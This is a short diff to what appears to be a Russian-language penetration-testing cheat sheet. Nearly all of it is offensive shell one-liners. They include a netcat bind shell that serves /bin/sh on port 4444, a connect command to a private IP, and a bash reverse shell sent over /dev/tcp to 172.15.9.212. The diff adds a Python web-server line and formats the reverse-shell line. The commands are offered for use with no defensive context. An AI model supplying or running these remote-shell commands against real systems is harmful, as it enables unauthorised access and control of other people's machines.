@@ -3,13 +3,16 @@
 ##Nc
 `nc -lvp 4444 -e /bin/sh`
 
+##Web-сервер
+`python3 -m http.server`
+
 ##Подключение
 `nc 192.168.1.135 4444`
 
 #Reverse Shell
 
 ##Tcp Linux
-bash -i >& /dev/tcp/172.15.9.212/4444 0>&1
+`bash -i >& /dev/tcp/172.15.9.212/4444 0>&1`
 
 ##Nc
 
